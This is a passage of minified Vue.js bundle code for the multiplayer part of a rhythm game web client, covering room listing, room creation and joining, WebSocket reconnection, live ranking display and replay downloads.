auto"}},_hoisted_2$1={class:"songsSourceSelectContainer"},_hoisted_3$1={class:"songsSourceSelect"},_hoisted_4$1={for:"sc1"},_hoisted_5$1=createBaseVNode("br",null,null,-1),_hoisted_6$1={for:"sc0"},_hoisted_7$1={key:0,class:"multiServer"},_hoisted_8$1={class:"multiServerSearch",style:{width:"83vw",margin:"0 auto"}},_hoisted_9$1={key:0,style:{"font-weight":"bold","font-size":"24px"}},_hoisted_10$1={value:"id"},_hoisted_11$1={value:"rks"},_hoisted_12$1={value:"playerNumber"},_hoisted_13$1=["value"],_hoisted_14$1={class:"multiServerList"},_hoisted_15$1={key:0,style:{width:"100%",height:"100%","font-size":"xx-large",display:"flex","align-items":"center","justify-content":"center",color:"dimgrey","margin-top":"-2.5vh"}},_hoisted_16$1={class:"multiServerDisp"},_hoisted_17$1={class:"line"},_hoisted_18$1={class:"name"},_hoisted_19$1={class:"playernumber"},_hoisted_20$1={class:"present"},_hoisted_21$1=createBaseVNode("div",{class:"total"},"/20",-1),_hoisted_22$1={class:"avgRks"},_hoisted_23$1={class:"line"},_hoisted_24$1={class:"line"},_hoisted_25$1={class:"ownerName"},_hoisted_26$1=["value","onClick"],_hoisted_27$1={key:1},_hoisted_28$1={key:1,style:{display:"flex","align-items":"center","justify-content":"center",width:"100%","flex-direction":"column"}},_hoisted_29$1={class:"loginPageRow"},_hoisted_30$1={class:"loginPageRow"},_hoisted_31$1={class:"loginPageRow"},_hoisted_32$1={for:"public"},_hoisted_33$1={class:"loginPageRow"},_hoisted_34$1=["value"];function _sfc_render$1(e,t,n,s,r,o){return openBlock(),createElementBlock("div",_hoisted_1$1,[createBaseVNode("div",_hoisted_2$1,[createBaseVNode("div",_hoisted_3$1,[createBaseVNode("div",null,[withDirectives(createBaseVNode("input",{type:"radio",id:"sc1",name:"selectChoice","onUpdate:modelValue":t[0]||(t[0]=l=>r.selectChoice=l),value:"join"},null,512),[[vModelRadio,r.selectChoice]]),createBaseVNode("label",_hoisted_4$1,toDisplayString$1(e.$t("multiIndex.join")),1)]),createBaseVNode("div",null,[_hoisted_5$1,withDirectives(createBaseVNode("input",{type:"radio",id:"sc0",name:"selectChoice","onUpdate:modelValue":t[1]||(t[1]=l=>r.selectChoice=l),value:"create"},null,512),[[vModelRadio,r.selectChoice]]),createBaseVNode("label",_hoisted_6$1,toDisplayString$1(e.$t("multiIndex.create")),1)])])]),createBaseVNode("div",{id:"songAndChartSelector",class:normalizeClass({blur:o.userBlurPreference}),style:{width:"90vw","border-radius":"12px",overflow:"hidden"}},[r.selectChoice==="join"?(openBlock(),createElementBlock("div",_hoisted_7$1,[createBaseVNode("div",_hoisted_8$1,[withDirectives(createBaseVNode("input",{class:"input","onUpdate:modelValue":t[2]||(t[2]=l=>r.filterParam1=l),style:{"padding-right":"5px"}},null,512),[[vModelText,r.filterParam1]]),r.filterType!="id"?(openBlock(),createElementBlock("span",_hoisted_9$1,"~")):createCommentVNode("",!0),r.filterType!="id"?withDirectives((openBlock(),createElementBlock("input",{key:1,class:"input","onUpdate:modelValue":t[3]||(t[3]=l=>r.filterParam2=l)},null,512)),[[vModelText,r.filterParam2]]):createCommentVNode("",!0),withDirectives(createBaseVNode("select",{"onUpdate:modelValue":t[4]||(t[4]=l=>r.filterType=l)},[createBaseVNode("option",_hoisted_10$1,toDisplayString$1(e.$t("multiIndex.byId")),1),createBaseVNode("option",_hoisted_11$1,toDisplayString$1(e.$t("multiIndex.byRks")),1),createBaseVNode("option",_hoisted_12$1,toDisplayString$1(e.$t("multiIndex.byPlayerNumber")),1)],512),[[vModelSelect,r.filterType]]),createBaseVNode("input",{type:"button",value:r.filterParam1||r.filterParam2?e.$t("multiIndex.search"):e.$t("multiIndex.refresh"),onClick:t[5]||(t[5]=l=>o.doSearch())},null,8,_hoisted_13$1)]),createBaseVNode("div",_hoisted_14$1,[r.roomList.length?createCommentVNode("",!0):(openBlock(),createElementBlock("div",_hoisted_15$1,[createBaseVNode("span",null,toDisplayString$1(e.$t("multiIndex.roomListEmpty")),1)])),(openBlock(!0),createElementBlock(Fragment,null,renderList(r.roomList,l=>(openBlock(),createElementBlock("div",_hoisted_16$1,[createBaseVNode("div",_hoisted_17$1,[createBaseVNode("div",_hoisted_18$1,toDisplayString$1(l.id),1),createBaseVNode("div",_hoisted_19$1,[createBaseVNode("div",_hoisted_20$1,toDisplayString$1(l.player_number),1),_hoisted_21$1]),createBaseVNode("div",_hoisted_22$1,toDisplayString$1(e.$t("multiIndex.avgRks"))+": "+toDisplayString$1(l.avg_rks.toFixed(2)),1)]),createBaseVNode("div",_hoisted_23$1,toDisplayString$1(l.description),1),createBaseVNode("div",_hoisted_24$1,[createBaseVNode("div",_hoisted_25$1,toDisplayString$1(e.$t("multiIndex.owner"))+": "+toDisplayString$1(l.owner_info),1),l.canJoin?(openBlock(),createElementBlock("input",{key:0,type:"button",value:l.joinText,onClick:d=>o.joinRoom(l.id)},null,8,_hoisted_26$1)):createCommentVNode("",!0),l.canJoin?createCommentVNode("",!0):(openBlock(),createElementBlock("span",_hoisted_27$1,toDisplayString$1(l.joinText),1))])]))),256))])])):createCommentVNode("",!0),r.selectChoice==="create"?(openBlock(),createElementBlock("div",_hoisted_28$1,[createBaseVNode("div",_hoisted_29$1,[createTextVNode(toDisplayString$1(e.$t("multiIndex.roomId"))+": ",1),withDirectives(createBaseVNode("input",{class:"input",style:{width:"calc(100%/2)"},"onUpdate:modelValue":t[6]||(t[6]=l=>r.createConfig.id=l)},null,512),[[vModelText,r.createConfig.id]])]),createBaseVNode("div",_hoisted_30$1,[createTextVNode(toDisplayString$1(e.$t("multiIndex.description"))+": ",1),withDirectives(createBaseVNode("input",{class:"input",style:{width:"calc(100%/2)"},"onUpdate:modelValue":t[7]||(t[7]=l=>r.createConfig.description=l)},null,512),[[vModelText,r.createConfig.description]])]),createBaseVNode("div",_hoisted_31$1,[withDirectives(createBaseVNode("input",{type:"checkbox",id:"public","onUpdate:modelValue":t[8]||(t[8]=l=>r.createConfig.isPublic=l)},null,512),[[vModelCheckbox,r.createConfig.isPublic]]),createBaseVNode("label",_hoisted_32$1,toDisplayString$1(e.$t("multiIndex.goPublic")),1)]),createBaseVNode("div",_hoisted_33$1,[createBaseVNode("input",{type:"button",value:e.$t("multiIndex.create"),onClick:t[9]||(t[9]=(...l)=>o.createRoom&&o.createRoom(...l)),id:"createBtn",style:{width:"6em"}},null,8,_hoisted_34$1)])])):createCommentVNode("",!0)],2)])}const multiIndexPageComponent=_export_sfc(_sfc_main$1,[["render",_sfc_render$1]]),EmptyPageComponent={name:"Empty",template:"<span></span>"},routes=[{path:"/startPage",component:StartPageComponent},{path:"/chartSelect",component:ChartSelectPageComponent},{path:"/playing",component:PlayingPageComponent},{path:"/login",component:LoginPageComponent},{path:"/calibrate",component:CalibratePageComponent},{path:"/cacheManage",component:CacheManagePageComponent},{path:"/aboutPage",component:AboutPageComponent},{path:"/chartUpload",component:UserChartUploadComponent},{path:"/chartEdit",component:UserChartEditComponent},{path:"/playerB20",component:PlayerB20Component},{path:"/pzRankSingle",component:PZRankSingleComponent},{path:"/replayPage",component:ReplayPageComponent},{path:"/changelogs",component:ChangeLogsComponent},{path:"/loading",component:LoadingPageComponent},{path:"/multiIndex",component:multiIndexPageComponent},{path:"/multipanel",component:EmptyPageComponent},{path:"/settings",component:EmptyPageComponent}],multiplayer_vue_vue_type_style_index_0_lang="";function jitsRenderer(e,t,n){if(!shared$1.game.multiInstance.JITSOpen)return;const s=function(o){const l=o.toFixed(0);return"0".repeat(l.length<7?7-l.length:0)+l};let r=[-1/0,-1/0,-1/0];t.font=`${n*.5}px Custom,Noto Sans SC`;for(let o=0;o<JITSData.tidp.length;o++){const l=JITSData.tidp[o],d=l.r,u=l.name.length>8?l.name.substr(0,8)+"..":l.name,f=shared$1.game.multiInstance.rankMethod==="score"?s(l.score):(l.acc*100).toFixed(2)+"%";l.name=u,l.disp=f;const m=t.measureText(d).width,g=t.measureText(u).width,y=t.measureText(f).width;m>r[0]&&(r[0]=m),g>r[1]&&(r[1]=g),y>r[2]&&(r[2]=y)}t.fillStyle="#000",t.globalAlpha=.2,shared$1.game.ptmain.gameConfig.enhanceRankVis&&t.fillRect(0,n*1.8,n*3.9+r[0]+r[1]+r[2],n*2.8),t.globalAlpha=1,JITSData.currRank&&(t.fillStyle="#fff",t.textBaseline="alphabetic",t.textAlign="center",t.font=`${n}px Custom,Noto Sans SC`,t.fillText(JITSData.currRank,n*.85,n*2.6),t.font=`${n*.37}px Custom,Noto Sans SC`,t.fillText(shared$1.game.ptmain.$t("multiplayer.liveRanking"),n*.9,n*3.2)),t.textAlign="left",t.font=`${n*.56}px Custom,Noto Sans SC`;for(let o=0;o<JITSData.tidp.length;o++)t.fillStyle=JITSData.tidp[o].me?"#7AD7FF":"#fff",t.fillText(JITSData.tidp[o].r,n*2.1,n*(o+2.4+.03)),t.fillText(JITSData.tidp[o].name,n*2.4+r[0],n*(o+2.4+.03)),t.fillText(JITSData.tidp[o].disp,n*3.5+r[1],n*(o+2.4+.03));t.fillStyle="#fff"}const wsHandler={url:null,ws:null,watchId:null,onMsgOut:null,wsTimeout:0,watchInterval:5e3,wsConnected:!1,wsRealClosed:!1,recovering:!1,callbackListeners:{},onMsgInternal(e){if(!e.data.byteLength){wsHandler.wsTimeout=0,wsHandler.wsConnected=!0;const t=JSON.parse(e.data);t.type=="success"?wsHandler.callbackListeners[t.data]&&(wsHandler.callbackListeners[t.data].resolve(),wsHandler.callbackListeners[t.data]=null):t.type=="roomInfo"?wsHandler.callbackListeners.getRoomInfo&&wsHandler.callbackListeners.getRoomInfo.resolve(t.data):t.type=="playBackFile"?wsHandler.callbackListeners.getPlayBackFile&&wsHandler.callbackListeners.getPlayBackFile.resolve(t.data):t.type=="alive"?wsHandler.callbackListeners.wsConnect&&(wsHandler.callbackListeners.wsConnect.res(),wsHandler.callbackListeners.wsConnect=null):t.type=="refused"?e.target===wsHandler.ws?(wsHandler.close(),wsHandler.callbackListeners.wsConnect&&(wsHandler.callbackListeners.wsConnect.rej(),wsHandler.callbackListeners.wsConnect=null)):e.target.close():wsHandler.onMsgOut&&wsHandler.onMsgOut(t)}},connect(e,t=null){return this.wsRealClosed=!1,this.wsConnected&&t?(this.onMsgOut=t,new Promise(n=>n())):new Promise((n,s)=>{!e&&!this.url||(e&&(this.url=location.protocol.replace("http","ws")+"//"+e),this.watchId||(this.watchId=setInterval(this.watch,this.watchInterval)),this.callbackListeners.wsConnect={res:n,rej:s},this.wsTimeout=0,this.ws=new WebSocket(this.url),this.ws.binaryType="arraybuffer",this.ws.onmessage=this.onMsgInternal,this.ws.onclose=this.ws.onerror=this.recover,t&&(wsHandler.onMsgOut=t))})},recover(){wsHandler.recovering||wsHandler.wsRealClosed||(wsHandler.recovering=!0,wsHandler.wsConnected=!1,wsHandler.wsTimeout=0,shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.connection.error"),"error"),wsHandler.watchId&&(clearInterval(wsHandler.watchId),wsHandler.watchId=null),shared$1.game.ptmain.$route.path!=="/playing"&&shared$1.game.loadHandler.l(shared$1.game.ptmain.$t("multiplayer.connection.wsRec"),"wsRec",!0),setTimeout(()=>{wsHandler.connect().then(async()=>{wsHandler.watchId=setInterval(wsHandler.watch,wsHandler.watchInterval),shared$1.game.loadHandler.r("wsRec"),shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.connection.reconnected")),await shared$1.game.multiInstance.recoverRoomStage()}).catch(async()=>{await shared$1.game.msgHandler.warning(shared$1.game.ptmain.$t("multiplayer.connection.forcedBroken")),localStorage.removeItem("lastMultiInfo"),location.reload()}),wsHandler.recovering=!1},3e3))},close(){this.watchId&&clearInterval(this.watchId),this.watchId=null,this.wsRealClosed=!0,this.ws.close()},send(e,t=null){return new Promise((n,s)=>{if(!wsHandler.wsConnected){s(shared$1.game.ptmain.$t("multiplayer.connection.sendDataFailed",{action:e}));return}const r={action:e};t&&(r.data=t),this.callbackListeners[e]={resolve:n,reject:s},this.ws.send(JSON.stringify(r))})},watch(){if(wsHandler.wsTimeout++>2){shared$1.game.ptmain.$route.path!=="/playing"&&shared$1.game.loadHandler.l(shared$1.game.ptmain.$t("multiplayer.connection.wsRec"),"wsRec",!0),wsHandler.ws.close(),wsHandler.wsTimeout=0,wsHandler.wsConnected=!1,wsHandler.watchId&&(clearInterval(wsHandler.watchId),wsHandler.watchId=null),wsHandler.recover();return}wsHandler.wsConnected&&wsHandler.ws.send('{"action":"alive"}')}};let JITSData={currRank:null,tidp:[],all:{}};const $$1=e=>document.getElementById(e),$$$=e=>document.body.querySelectorAll(e),_sfc_main={mounted(){self.addEventListener("load",()=>{shared$1.game.multiInstance=this,shared$1.game.wsHandler=wsHandler})},data:()=>({evts:[],forceOpen:!1,owner:!1,user:null,room:{stage:0},panelOpen:!1,panelChoice:"messages",gaming:!1,exited:!1,roundRanked:[],chartLoaded:!1,speedInfo:null,timeStr:"",rankFull:!1,rankMethod:"score",JITSOpen:!0,wsConn:null,watchUserId:null,SERVERADDR:""}),methods:{async downloadAllPlayBack(){if(this.exited&&shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.downloadPlayBack.roomClosed"),"error"),!this.room.compete_mode||this.owner){if(!await shared$1.game.msgHandler.confirm(shared$1.game.ptmain.$t("multiplayer.downloadAllPlayBack.confirm")))return;const e=this.roundRanked.length;for(let t=0;t<e;t++){const n=this.roundRanked[t].scores;for(const s of n)await this.downloadSinglePlayBack(e-t-1,s.id)}shared$1.game.msgHandler.success(shared$1.game.ptmain.$t("multiplayer.downloadAllPlayBack.done"))}else{shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.downloadPlayBack.noAccess"),"error");return}},async wrappedSinglePlayBack(e,t,n){if(this.exited&&shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.downloadPlayBack.roomClosed"),"error"),!this.room.compete_mode||this.owner){if(!await shared$1.game.msgHandler.confirm(shared$1.game.ptmain.$t("multiplayer.wrappedSinglePlayBack.confirm")))return;n===0&&(e=this.roundRanked.length-e-1),this.downloadSinglePlayBack(e,t)}else{shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.downloadPlayBack.noAccess"),"error");return}},downloadSinglePlayBack(e,t){return new Promise((n,s)=>{wsHandler.send("getPlayBackFile",{round:e,player:t}).then(async r=>{try{let o=r.slice(0,-32),l=r.slice(-32);if(o=atob(o),md5$1(o)!==l){await shared$1.game.msgHandler.failure(shared$1.game.ptmain.$t("multiplayer.downloadSinglePlayBack.cheating",{player:t,round:e})),s();return}o=JSON.parse(o);const d=JSON.parse(decodeURIComponent(o.playerInfo)),u=JSON.parse(decodeURIComponent(o.chartInfo));if(window.spec.isPhiTogetherApp&&window.spec.is)return shared$1.game.msgHandler.sendMessage("iOS版PhiTogether App暂不支持批量导出游玩回放","error");const f=new Blob([r],{type:"application/json"});(window.nativeApi?window.nativeApi.saveAs.bind(window.nativeApi):saveAs)(window.nativeApi?r:f,`${u.songData.name}${u.chartData.level}${u.chartData.difficulty}-${d.username}-${new Date().format("YmdHis")}.ptr`),n()}catch{await shared$1.game.msgHandler.failure(shared$1.game.ptmain.$t("multiplayer.downloadSinglePlayBack.cheating",{player:t,round:e})),s();return}})})},getScoresLR(e,t){const n=visualViewport.width;let s=7;n>=700&&(s=8),n>=760&&(s=9);const r=e.length;if(r<=s)return t=="l"?[]:t=="n"?0:e;{const o=r-s,l=o%2===0?o/2:(o+1)/2;return t=="l"?e.slice(0,l):t=="n"?l:e.slice(l)}},switchRankMethod(){this.rankMethod==="score"?this.rankMethod="acc":this.rankMethod="score",this.updateRankList(!0)},async recoverRoomStage(){return new Promise((e,t)=>{try{wsHandler.send("getRoomInfo").then(async n=>{if(this.room=n,this.evts=n.evt.reverse(),this.owner=this.user.id==this.room.owner,this.owner){for(const s of $$$(".hideForMultiRoomOwner"))s.style.display="none";for(const s of $$$(".hideForMultiRegularPlayer"))s.style.display="block";for(const s of $$$(".disabled-when-selected"))s.classList.add("disabled")}else{for(const s of $$$(".hideForMultiRoomOwner"))s.style.display="none";for(const s of $$$(".hideForMultiRegularPlayer"))s.style.display="none"}switch(this.room.stage){case 0:this.owner?(shared$1.game.ptmain.$router.replace("/multipanel"),shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.tips.afterCreated.roomOwner"))):(shared$1.game.ptmain.$router.replace("/multipanel"),shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.tips.afterCreated.player",[this.room.players[this.room.owner].name])));for(const s of $$$(".disabled-when-selected"))s.classList.remove("disabled");break;case 1:for(const s of $$$(".disabled-when-selected"))s.classList.remove("disabled");this.owner?(shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.tips.selectChart.roomOwner")),shared$1.game.ptmain.$router.replace("/chartSelect")):(shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.tips.selectChart.player")),shared$1.game.ptmain.$router.replace("/multipanel"));break;case 2:this.chartLoaded||(shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.tips.loadingChart")),this.loadLastChart());break;case 3:if(this.room.playRounds[this.room.playRound].scores&&this.room.playRounds[this.room.playRound].scores[this.user.id]){shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.tips.waitingForOthers")),shared$1.game.ptmain.$router.replace("/multipanel");break}else shared$1.game.ptmain.$route.path!="/playing"&&!this.chartLoaded&&(shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.tips.chartLoaded")),this.loadLastChart());break;case 4:shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.tips.thisRoundIsOver")),this.showStat();break;case 5:this.chartLoaded||(shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.tips.loadingChart")),this.loadLastChart());break}e()})}catch{t()}})},async recoverMulti(e){this.wsConn=e.wsConn;try{await wsHandler.connect(this.wsConn,null)}catch{shared$1.game.msgHandler.warning(shared$1.game.ptmain.$t("multiplayer.recoverMultiFailed")),localStorage.removeItem("lastMultiInfo"),shared$1.game.loadHandler.r("recoverMulti"),shared$1.game.loadHandler.r("wsRec")}shared$1.game.ptmain.gameMode="multi",this.room=e.room,this.user=e.user,this.owner=this.room.owner===this.user.id,await this.recoverRoomStage(),shared$1.game.loadHandler.r("recoverMulti"),this.renewEvents(),shared$1.game.graphicHandler.register("whilePlayingHook",jitsRenderer),shared$1.game.ptmain.gameConfig.defaultRankMethod&&(this.rankMethod=shared$1.game.ptmain.gameConfig.defaultRankMethod),this.JITSOpen=shared$1.game.ptmain.gameConfig.JITSOpen},loadLastChart(){for(let e=0;e<this.evts.length;e++){const t=this.evts[e];if(t.type=="loadChart"){this.loadChartFirst(t.extraInfo);break}}},doCreateRoom(e,t,n,s){shared$1.game.ptmain.gameConfig.defaultRankMethod&&(this.rankMethod=shared$1.game.ptmain.gameConfig.defaultRankMethod),this.JITSOpen=shared$1.game.ptmain.gameConfig.JITSOpen,this.SERVERADDR=t;let r=new Headers;r.append("Content-Type","application/json");let o=new Request(`${location.protocol}//${this.SERVERADDR}/api/multi/createRoom/${e}`,{method:"POST",body:JSON.stringify({access_token:shared$1.game.ptmain.gameConfig.account.tokenInfo.access_token,compete_mode:shared$1.game.ptmain.gameConfig.competeMode,public:s,description:n}),headers:r});fetch(o).then(l=>l.json()).then(l=>{if(shared$1.game.loadHandler.r("createRoom"),l.code!=0){shared$1.game.msgHandler.failure(l.msg);return}showTransition$1.checked=!0,shared$1.game.ptmain.gameMode="multi",this.owner=!0,this.room=l.selfRoom,this.user=l.selfUser,this.evts=this.room.evt.reverse(),this.wsConn=l.wsConn,localStorage.lastMultiInfo=JSON.stringify({room:this.room,user:this.user,wsConn:l.wsConn});for(const u of $$$(".hideForMultiRoomOwner"))u.style.display="none";shared$1.game.ptmain.$router.replace("/multipanel"),shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.tips.afterCreated.roomOwner")),this.renewEvents();const d=shared$1.game.ptmain.$t("multiplayer.doCreateRoom.shareInfo",[window.location.protocol,window.location.host,this.room.id]);shared$1.game.msgHandler.confirm(shared$1.game.ptmain.$t("multiplayer.doCreateRoom.copyShareInfoConfirm",{shareInfo:d}),shared$1.game.ptmain.$t("multiplayer.doCreateRoom.copyShareInfo"),shared$1.game.ptmain.$t("info.confirm"),shared$1.game.ptmain.$t("info.cancel")).then(async u=>{if(u)try{await navigator.clipboard.writeText(d)}catch{document.oncontextmenu=m=>{},document.body.style.userSelect="text",document.documentElement.style.userSelect="text",document.querySelector(".main").style.userSelect="text",await shared$1.game.msgHandler.failure(shared$1.game.ptmain.$t("multiplayer.doCreateRoom.autoCopyFailed",{shareInfo:d})),document.oncontextmenu=m=>m.preventDefault(),document.body.style.userSelect="none",document.documentElement.style.userSelect="none",document.querySelector(".main").style.userSelect="none"}})}).catch(l=>{shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.doCreateRoom.failed"),"error"),shared$1.game.loadHandler.r("createRoom")})},doJoinRoom(e,t){shared$1.game.ptmain.gameConfig.defaultRankMethod&&(this.rankMethod=shared$1.game.ptmain.gameConfig.defaultRankMethod),this.JITSOpen=shared$1.game.ptmain.gameConfig.JITSOpen,this.SERVERADDR=t;let n=new Headers;n.append("Content-Type","application/json");let s=new Request(`${location.protocol}//${this.SERVERADDR}/api/multi/joinRoom/${e}`,{method:"POST",body:JSON.stringify({access_token:shared$1.game.ptmain.gameConfig.account.tokenInfo.access_token}),headers:n});fetch(s).then(r=>r.json()).then(r=>{if(shared$1.game.loadHandler.r("joinRoom"),r.code!=0){shared$1.game.msgHandler.failure(r.msg);return}showTransition$1.checked=!0,shared$1.game.ptmain.gameMode="multi",this.room=r.selfRoom,this.user=r.selfUser,this.wsConn=r.wsConn,this.evts=this.room.evt.reverse(),localStorage.lastMultiInfo=JSON.stringify({room:this.room,user:this.user,wsConn:r.wsConn});for(const o of $$$(".hideForMultiRoomOwner"))o.style.display="none";for(const o of $$$(".hideForMultiRegularPlayer"))o.style.display="none";shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.tips.afterCreated.player",[this.room.players[this.room.owner].name])),shared$1.game.ptmain.$router.replace("/multipanel"),this.renewEvents()}).catch(r=>{shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.joinRoom.failed"),"error"),shared$1.game.loadHandler.r("joinRoom")})},async actionPlayer(e,t,n){if(this.owner&&e!=this.user.id&&!n){if(!await shared$1.game.msgHandler.confirm(shared$1.game.ptmain.$t("multiplayer.actionPlayer.confirm",{name:t})))return;setTimeout(async()=>{if(await shared$1.game.msgHandler.confirm(shared$1.game.ptmain.$t("multiplayer.actionPlayer.askForAction",{name:t}),shared$1.game.ptmain.$t("info.info"),shared$1.game.ptmain.$t("multiplayer.actionPlayer.actions.kickPlayer"),shared$1.game.ptmain.$t("multiplayer.actionPlayer.actions.transferOwnerShip")))wsHandler.send("kickPlayer",e);else{if(this.room.compete_mode){shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.actionPlayer.error_competeMode"));return}wsHandler.send("transferOwnerShip",e)}},500)}},exitRoom(){if(this.room.compete_mode&&!this.owner){shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.exitRoom.error_competeMode"),"error");return}this.gaming&&(btnPlay$2.value=="停止"&&btnPlay$2.click(),this.gaming=!1),this.selfExit=!0,wsHandler.send("kickPlayer",this.user.id)},lockRoom(){shared$1.game.loadHandler.l(shared$1.game.ptmain.$t("multiplayer.lockRoom.locking"),"lockRoom",!0),wsHandler.send("lockRoom").then(async()=>{shared$1.game.loadHandler.r("lockRoom"),await shared$1.game.msgHandler.success(shared$1.game.ptmain.$t("multiplayer.lockRoom.locked")),shared$1.game.ptmain.$router.replace("/chartSelect")}).catch(()=>{shared$1.game.loadHandler.r("lockRoom"),shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.lockRoom.err"),"error")})},sendMsg(){const e=$$1("sendMsgInput"),t=$$1("msgSend");if(!e.value){shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.sendMsg.cantBeEmpty"),"error");return}e.classList.add("disabled"),t.classList.add("disabled"),wsHandler.send("userMsg",e.value).then(()=>{shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.sendMsg.success")),e.value="",e.classList.remove("disabled"),t.classList.remove("disabled")}).catch(()=>{shared$1.game.msgHandler.sendMessage(shared$1.game.ptmain.$t("multiplayer.sendMsg.failed"),"error"),e.classList.remove("disabled"),t.classList.remove("disabled")})},getDifficultyActual(e){return typeof e.difficulty=="string"?e.difficulty:e.difficulty===0?"?":Math.floor(e.difficulty).toString()},updateRankList(e=!1){this.timeStr=`${new Date().format("Y-m-d H:i:s")}`;let t=this.room.playRounds;e&&(this.roundRanked=[]);const n=this.roundRanked.length;for(let s=n;s<t.length;s++){let r=t[s],o=[];if(!r.finished)break;for(const l in r.scores)r.scores[l].id=l,o.push(r.scores[l]);o=this.sortByKey(o,this.rankMethod==="score"?"scoreNum":"accNum",!1),this.exited?this.roundRanked.push({scores:o,chartInfo:r.chartInfo}):this.roundRanked.unshift({scores:o,chartInfo:r.chartInfo})}this.rankedUser=[];for(const s in this.room.players)this.room.compete_mode&&this.room.players[s].id==this.room.owner||this.rankedUser.push(this.room.players[s]);this.rankedUser=this.sortByKey(this.rankedUser,this.rankMethod==="score"?"scoreAvg":"accAvg",!1)},renewRoomInfoAll(){return new Promise((e,t)=>{wsHandler.send("getRoomInfo").then(n=>{this.room=n,this.user=n.players[this.user.id],this.updateRankList(),e(!0)})})},updateJITS(){let e=[];for(const s in JITSData.all)e.push(JITSData.all[s]);e=this.sortByKey(e,this.rankMethod==="score"?"score":"acc",!1);const t=e.length;let n;if(this.room.compete_mode&&this.owner)n=e.findIndex(s=>s.id==this.watchUserId),n<0&&(n=0,this.watchUserId=e[0].id);else if(n=e.findIndex(s=>s.id==this.user.id),n<0){JITSData.all={},JITSData.currRank=null;return}if(e[n].me=!0,JITSData.currRank=n+1,t<=3){const s=[];for(let r=0;r<t;r++)s.push({...e[r],r:r+1});JITSData.tidp=s}else n===0?JITSData.tidp=[{...e[0],r:1},{...e[1],r:2},{...e[2],r:3}]:n===t-1?JITSData.tidp=[{...e[n-2],r:n-1},{...e[n-1],r:n},{...e[n],r:n+1}]:JITSData.tidp=[{...e[n-1],r:n},{...e[n],r:n+1},{...e[n+1],r:n+2}]},JITSStart(){this.JITSStop(),this.JITSTimer=setInterval(()=>{if(this.updateJITS(),!(this.room.compete_mode&&this.owner)){const e=shared$1.game.stat;let t={acc:e.accNum,score:e.scoreNum,first:!1};JITSData.all[this.user.id].acc=t.acc,JITSData.all[this.user.id].score=t.score,wsHandler.send("JITS",t).catch(()=>{})}},500)},JITSStop(){this.JITSTimer&&clearInterval(this.JITSTimer)},renewEvents(){const e=this;function t(n){switch(n.type){case"JITS":if(n.extraInfo.id===e.user.id)return;JITSData.all[n.extraInfo.id]=n.extraInfo;return;case"allJITS":JITSData.all=n.extraInfo,e.updateJITS();return;case"userMsg":shared$1.game.ptmain.$route.path!=="/playing"&&(!e.panelOpen||e.panelChoice!="messages")&&shared$1.game.msgHandler.sendMessage(n.msg);break;case"ownerChanged":const s=e.owner;if(e.room.owner=n.extraInfo,e.owner=e.user.id==n.extraInfo,e.user.isOwner=e.owner,e.room.players[n.extraInfo].isOwner=e.owner,localStorage.lastMultiInfo=JSON.stringify({room:e.room,user:e.user,wsConn:e.wsConn}),e.owner)shared$1.game.msgHandler.warning(e.$t("multiplayer.tips.becameRoomOwner")),e.recoverRoomStage();else if(s)switch(e.room.stage){case 0:shared$1.game.ptmain.$router.replace("/multipanel"),shared$1.game.msgHandler.sendMessage(e.$t("multiplayer.tips.afterCreated.player",[e.room.players[e.room.owner].name]));for(const l of $$$(".disabled-when-selected"))l.classList.remove("disabled");break;case 1:for(const l of $$$(".disabled-when-selected"))l.classList.remove("disabled");shared$1.game.msgHandler.sendMessage(e.$t("multiplayer.tips.selectChart.player")),shared$1.game.ptmain.$router.replace("/multipanel");break}break;case"reOnline":e.room.players[n.extraInfo]&&(e.room.players[n.extraInfo].online=!0);break;case"offline":e.room.players[n.extraInfo]&&(e.room.players[n.extraInfo].online=!1);break;case"join":let r=n.extraInfo;e.room.playerNumber++,e.room.players[r.id]=r;break;case"close":shared$1.game.msgHandler.info(e.$t("multiplayer.roomClosed")),localStorage.removeItem("lastMultiInfo"),e.room=n.extraInfo,e.evts=n.extraInfo.evt.reverse(),e.room.stage==0?location.reload():(e.exited=!0,e.room.closed=!0,btnPlay$2.value=="停止"&&btnPlay$2.click(),e.showStat("playerRank"));break;case"exit":if(n.extraInfo.id===e.user.id){if(n.extraInfo.type===1&&!e.selfExit)break;localStorage.removeItem("lastMultiInfo"),e.exited=!0,btnPlay$2.value=="停止"&&btnPlay$2.click(),shared$1.game.msgHandler.info(e.$t("multiplayer.exitRoom.exited")).then(async()=>{localStorage.removeItem("lastMultiInfo"),e.room.stage==0?location.reload():e.showStat("playerRank")})}else e.room.stage==0?delete 